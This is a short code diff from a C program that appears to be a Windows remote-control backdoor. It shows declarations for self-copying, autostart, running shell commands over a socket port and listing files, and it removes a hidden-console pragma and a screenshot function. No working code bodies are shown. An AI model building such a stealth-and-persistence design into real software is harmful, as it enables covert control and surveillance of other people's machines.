@@ -18,10 +18,6 @@
 #include <winsock2.h>
 #pragma comment(lib, "ws2_32.lib")
 
-#ifdef _MSC_VER  
-#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )  
-#endif
-
 //不显示控制台黑色窗口
 //#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
 #define PORT 65533
@@ -69,10 +65,6 @@ int ComputerStart(char* pathName);
 int copySelf(char* path);
 //执行shell指令
 int cmd(char* cmdStr, char* message);
-//获取桌面截图
-void ScreenShot(LPCTSTR s);
-////打开文件
-//void readSrc(SOCKET fd);
 //获取文件名
 void GetFileName(char FileName[FileNameRow][FileNameCol]);
 
